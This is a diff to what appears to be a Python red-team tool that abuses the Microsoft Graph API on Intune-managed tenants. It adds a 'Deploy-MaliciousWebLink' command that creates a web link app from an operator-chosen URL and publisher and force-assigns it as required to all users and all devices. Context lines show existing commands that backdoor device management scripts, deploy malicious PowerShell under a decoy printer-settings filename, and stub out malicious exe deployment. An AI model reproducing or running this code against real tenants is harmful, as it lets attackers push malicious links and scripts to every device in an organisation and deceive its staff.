@@ -165,7 +165,8 @@ def list_commands():
         ["Dump-AndroidApps", "Dump managed Android mobile applications"],
         ["Get-ScriptContent", "Get device management script content"],
         ["Backdoor-Script", "Add malicious code to pre-existing device management script"],
-        ["Deploy-MaliciousScript", "Deploy new malicious device management PowerShell script (all devices)"],
+        ["Deploy-MaliciousScript", "Deploy new malicious device management PowerShell script"],
+        ["Deploy-MaliciousWebLink", "Deploy malicious Windows web link application"],
         # Deploy-MaliciousWin32Exe - Deploy malicious exe to managed devices
         # Deploy-MaliciousWin32MSI - Deploy malicious MSI to managed devices
         ["Display-AVPolicyRules", "Display antivirus policy rules"],
@@ -659,7 +660,7 @@ def main():
         "get-manageddevices", "get-userdevices", "get-caps", "get-devicecategories", "get-devicecompliancepolicies", "update-deviceconfig",
         "get-devicecompliancesummary", "get-deviceconfigurations", "get-deviceconfigurationpolicies", "get-deviceconfigurationpolicysettings", 
         "get-deviceenrollmentconfigurations", "get-devicegrouppolicyconfigurations","update-userproperties", "dump-windowsapps", "dump-iosapps", "dump-androidapps",
-        "get-devicegrouppolicydefinition", "dump-devicemanagementscripts", "get-scriptcontent", "find-privilegedapplications", "dump-macosapps",
+        "get-devicegrouppolicydefinition", "dump-devicemanagementscripts", "get-scriptcontent", "find-privilegedapplications", "dump-macosapps", "deploy-maliciousweblink",
         "get-roledefinitions", "get-roleassignments", "display-avpolicyrules", "display-asrpolicyrules", "display-diskencryptionpolicyrules", "display-firewallconfigpolicyrules",
         "display-firewallrulepolicyrules", "display-lapsaccountprotectionpolicyrules", "display-usergroupaccountprotectionpolicyrules", "get-appserviceprincipal",
         "display-edrpolicyrules","add-exclusiongrouptopolicy", "deploy-maliciousscript", "reboot-device", "shutdown-device", "lock-device", "backdoor-script",
@@ -733,7 +734,7 @@ def main():
             "get-currentuseractivities", "get-orginfo", "get-domains", "list-authmethods", "list-directoryroles", 
             "list-notebooks", "list-conditionalaccesspolicies", "list-conditionalauthenticationcontexts", 
             "list-conditionalnamedlocations", "list-sharepointroot", "list-sharepointsites", "list-sharepointurls","list-externalconnections", 
-            "list-applications", "list-serviceprincipals", "list-tenants", "list-joinedteams", "list-chats", 
+            "list-applications", "list-serviceprincipals", "list-tenants", "list-joinedteams", "list-chats", "deploy-maliciousweblink",
             "list-chatmessages", "list-devices", "list-administrativeunits", "list-onedrives", "list-recentonedrivefiles", "list-onedriveurls",
             "list-sharedonedrivefiles", "invoke-customquery", "invoke-search", "find-privilegedroleusers", "display-firewallconfigpolicyrules",
             "find-updatablegroups", "find-dynamicgroups","find-securitygroups", "locate-objectid", "update-userpassword", "add-applicationpassword", 
@@ -2962,7 +2963,7 @@ def main():
                             if web_url:
                                 print(web_url)
             else:
-                print_yellow("[!] No results found in the response.")
+                print_yellow("[-] No results found in the response.")
             
             next_link = response_body.get("@odata.nextLink")
             while next_link:
@@ -3285,7 +3286,7 @@ def main():
                             if web_url:
                                 print(web_url)
             else:
-                print_yellow("[!] No results found in the response.")
+                print_yellow("[-] No results found in the response.")
             
             next_link = response_body.get("@odata.nextLink")
             while next_link:
@@ -3552,7 +3553,7 @@ def main():
                 response_data = response.json()
                 for group in response_data['value']:
                     if 'id' not in group:
-                        print_yellow(f"[!] Group without 'id' found, skipping")
+                        print_yellow(f"[-] Group without 'id' found, skipping")
                         continue
                     group_id = group['id']
                     request_body = {
@@ -4911,10 +4912,53 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
         print_yellow("\n[*] Dump-WindowsApps")
         print("=" * 80)
         api_url = "https://graph.microsoft.com/beta/deviceAppManagement/mobileApps?$filter=(isof(%27microsoft.graph.win32CatalogApp%27)%20or%20isof(%27microsoft.graph.windowsStoreApp%27)%20or%20isof(%27microsoft.graph.microsoftStoreForBusinessApp%27)%20or%20isof(%27microsoft.graph.officeSuiteApp%27)%20or%20(isof(%27microsoft.graph.win32LobApp%27)%20and%20not(isof(%27microsoft.graph.win32CatalogApp%27)))%20or%20isof(%27microsoft.graph.windowsMicrosoftEdgeApp%27)%20or%20isof(%27microsoft.graph.windowsPhone81AppX%27)%20or%20isof(%27microsoft.graph.windowsPhone81StoreApp%27)%20or%20isof(%27microsoft.graph.windowsPhoneXAP%27)%20or%20isof(%27microsoft.graph.windowsAppX%27)%20or%20isof(%27microsoft.graph.windowsMobileMSI%27)%20or%20isof(%27microsoft.graph.windowsUniversalAppX%27)%20or%20isof(%27microsoft.graph.webApp%27)%20or%20isof(%27microsoft.graph.windowsWebApp%27)%20or%20isof(%27microsoft.graph.winGetApp%27))%20and%20(microsoft.graph.managedApp/appAvailability%20eq%20null%20or%20microsoft.graph.managedApp/appAvailability%20eq%20%27lineOfBusiness%27%20or%20isAssigned%20eq%20true)&$orderby=displayName&"
-
         if args.select:
             api_url += "$select=" + args.select # some fields will 400 whole req
-
+        if args.id:
+            api_url = f"https://graph.microsoft.com/beta/deviceAppManagement/mobileApps/{args.id}?$expand=assignments"
+            user_agent = get_user_agent(args)
+            headers = {
+                'Authorization': f'Bearer {access_token}',
+                'User-Agent': user_agent
+            }
+            try:
+                response = requests.get(api_url, headers=headers)
+                response.raise_for_status()
+                json_data = response.json()
+                json_data.pop('@odata.context', None)
+                json_data.pop('assignments@odata.context', None)  
+                for key, value in json_data.items():
+                    if key == 'assignments':
+                        if not value:
+                            print_red("assignments: None")
+                        else:
+                            print_green("assignments:")
+                            for assignment in value:
+                                print(f"  - ID: {assignment['id']}")
+                                print(f"    Intent: {assignment['intent']}")
+                                if 'target' in assignment:
+                                    target = assignment['target']
+                                    odata_type = target.get('@odata.type', '').split('.')[-1]
+                                    print(f"    Target:")
+                                    if odata_type == 'exclusionGroupAssignmentTarget':
+                                        group_id = target.get('groupId', 'N/A')
+                                        print(f"      Excluded Group ID: {group_id}")
+                                    elif odata_type == 'allLicensedUsersAssignmentTarget':
+                                        print("      Assigned to all users")
+                                    elif odata_type == 'allDevicesAssignmentTarget':
+                                        print("      Assigned to all devices")
+                                    elif odata_type == 'groupAssignmentTarget':
+                                        group_id = target.get('groupId', 'N/A')
+                                        print(f"      Assigned to Group ID: {group_id}")
+                                    else:
+                                        print(f"      {odata_type}: {target}")
+                                print()  
+                    else:
+                        print(f"{key}: {value}")
+            except requests.exceptions.RequestException as ex:
+                print_red(f"[-] HTTP Error: {ex}")
+            print("=" * 80)
+            return
         graph_api_get(access_token, api_url, args)
         print("=" * 80)
 
@@ -4993,7 +5037,7 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
                 print(decoded_script_content)
 
         except requests.exceptions.RequestException as ex:
-            print(f"[!] HTTP Error: {ex}")
+            print(f"[-] HTTP Error: {ex}")
         print("=" * 80)
 
     # display-avpolicyrules
@@ -6412,7 +6456,7 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
             "scriptContent": encoded_script_content,
             "runAsAccount": runasaccount,
             "enforceSignatureCheck": sigcheck == 'true',
-            "fileName": "Deploy-PrinterSettings.ps1", # use legit Intune script name
+            "fileName": "Deploy-PrinterSettings.ps1", 
             "runAs32Bit": runas32bit == 'true'
         }
 
@@ -6486,6 +6530,7 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
         if not args.id or not args.script:
             print_red("[-] Error: --id and --script required for Backdoor-Script command")
             return
+
         print_yellow("\n[*] Backdoor-Script")
         print("=" * 80)
         api_url = f"https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts/{args.id}"
@@ -6497,7 +6542,7 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
         }
         
         # 1. get current target script settings and encode new script content so we don't override anything
-        # - could add option to alter pre-existing settings...
+        # - could add option to alter pre-existing settings
         try:
             script_content = read_file_content(args.script)
             encoded_script_content = base64.b64encode(script_content.encode('utf-8')).decode('utf-8')
@@ -6542,6 +6587,90 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
             print_red(patch.text)
         print("=" * 80)
 
+    # deploy-maliciousweblink
+    elif args.command and args.command.lower() == "deploy-maliciousweblink":
+        print_yellow("\n[*] Deploy-MaliciousWebLink")
+        print("=" * 80)
+        
+        api_url = "https://graph.microsoft.com/beta/deviceAppManagement/mobileApps/"
+        user_agent = get_user_agent(args)
+        headers = {
+            'Authorization': f'Bearer {access_token}',
+            'Content-Type': 'application/json',
+            'User-Agent': user_agent
+        }
+        
+        try:
+            # all required 
+            appUrl = input("\nApp URL: ").strip()
+            description = input("Description: ").strip()
+            displayName = input("Display Name: ").strip()
+            publisher = input("Publisher: ").strip()
+            isFeatured = input("Show this as a featured app in the Company Portal? (true/false): ").strip().lower()
+            if isFeatured not in ['true', 'false']:
+                print("Invalid input for Company Portal. Defaulting to 'False'.")
+                isFeatured = 'False'
+        except KeyboardInterrupt:
+            sys.exit()
+
+        json_body = {
+            "@odata.type": "#microsoft.graph.windowsWebApp",
+            "appUrl": appUrl,
+            "categories": [],
+            "description": description,
+            "developer": "",
+            "displayName": displayName,
+            "informationUrl": "",
+            "isFeatured": isFeatured,
+            "notes": "",
+            "owner": "",
+            "privacyInformationUrl": "",
+            "publisher": publisher,
+            "roleScopeTagIds": []
+        }
+        
+        response = requests.post(api_url, json=json_body, headers=headers)
+        if response.ok:
+            result = response.json()
+            print_green("\n[+] Malicious web link app deployed successfully")
+            
+            appid = result['id']
+            print(f"\nApp ID: {appid}")
+            
+            assign_url = f"https://graph.microsoft.com/beta/deviceAppManagement/mobileApps/{appid}/assign"
+            assign_body = {
+                "mobileAppAssignments": [
+                    {
+                        "@odata.type": "#microsoft.graph.mobileAppAssignment",
+                        "target": {
+                            "@odata.type": "#microsoft.graph.allLicensedUsersAssignmentTarget"
+                        },
+                        "intent": "Required",
+                        "settings": None
+                    },
+                    {
+                        "@odata.type": "#microsoft.graph.mobileAppAssignment",
+                        "target": {
+                            "@odata.type": "#microsoft.graph.allDevicesAssignmentTarget"
+                        },
+                        "intent": "Required",
+                        "settings": None
+                    }
+                ]
+            }
+            
+            assign = requests.post(assign_url, json=assign_body, headers=headers)
+            if assign.ok:
+                print_green("\n[+] Web link app assigned successfully")
+            else:
+                print_red(f"\n[-] Failed to assign web link app: {response.status_code}")
+                print_red(response.text)
+        else:
+            print_red(f"[-] Failed to create web link app: {response.status_code}")
+            print_red(response.text)
+        
+        print("=" * 80)
+
     # deploy-maliciouswin32app
     # - user will have to packagae app prior
     # https://cloudinfra.net/how-to-deploy-exe-applications-using-intune/
@@ -6549,7 +6678,6 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
     # 
     # POST https://graph.microsoft.com/beta/deviceAppManagement/mobileApps/
     # {"@odata.type":"#microsoft.graph.win32LobApp","applicableArchitectures":"x64,x86","allowAvailableUninstall":false,"categories":[],"description":"IntuneMessageBox","developer":"","displayName":"IntuneMessageBox","displayVersion":"","fileName":"IntuneMessageBox.intunewin","installCommandLine":"IntuneMessageBox.exe","installExperience":{"deviceRestartBehavior":"suppress","maxRunTimeInMinutes":30,"runAsAccount":"system"},"informationUrl":"","isFeatured":false,"roleScopeTagIds":[],"notes":"","minimumSupportedWindowsRelease":"1607","msiInformation":null,"owner":"","privacyInformationUrl":"","publisher":"ECorp","returnCodes":[{"returnCode":0,"type":"success"},{"returnCode":1707,"type":"success"},{"returnCode":3010,"type":"softReboot"},{"returnCode":1641,"type":"hardReboot"},{"returnCode":1618,"type":"retry"}],"rules":[{"@odata.type":"#microsoft.graph.win32LobAppFileSystemRule","ruleType":"detection","operator":"notConfigured","check32BitOn64System":false,"operationType":"exists","comparisonValue":null,"fileOrFolderName":"IntuneMessageBox.exe","path":"C:\\Program Files\\IntuneMessageBox.exe"}],"runAs32Bit":false,"setupFilePath":"IntuneMessageBox.exe","uninstallCommandLine":"IntuneMessageBox.exe"}
-    # - ime tried to install
     # -> need to add install/uninstall instruction batch script
     elif args.command and args.command.lower() == "deploy-maliciouswin32exe": # don't use this yet
         url = "https://graph.microsoft.com/beta/deviceAppManagement/mobileApps/"
@@ -6605,7 +6733,7 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
         }
 
     # deploy-maliciouswin32msi
-    # - after confirming win32exe 
+    # - todo
 
     # update-deviceconfig
     elif args.command and args.command.lower() == "update-deviceconfig":
